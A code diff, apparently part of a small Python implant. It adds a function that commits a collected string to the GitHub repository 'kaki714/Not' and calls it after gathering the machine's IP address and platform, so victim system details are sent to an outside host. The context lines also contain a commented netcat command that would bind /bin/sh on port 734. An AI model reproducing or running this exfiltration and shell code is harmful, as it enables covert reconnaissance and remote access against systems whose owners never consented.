@@ -18,6 +18,25 @@ def create_file(file_path, content):
 def delete_file(file_path):
     os.remove(file_path)
 
+def upload_file(token,fname,sntc):
+	g = Github("tu_token")
+	repo = g.get_repo("kaki714/Not")
+	filename = "archivo.txt"
+	data = sntc
+
+	with open(filename, "w") as f:
+	    f.write(data)
+	path = "data/data.txt" # Especifica la ruta y el nombre del archivo en el repositorio
+	commit_message = "Agregando data.txt al repositorio" # Especifica el mensaje del commit
+
+	# Crea el archivo en el repositorio
+	repo.create_file(path, commit_message, data)
+		
+	
+
+
+	
+
 
 
         
@@ -41,6 +60,7 @@ def run(token):
     stmnt= 'Info: '+ IPAddr+' System: '+sysconfig.get_platform()
     print(stmnt)
     create_file(fname,stmnt)  
+    upload_file(token,fname,stmnt)
     if "Linux" in platform.system():
         #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
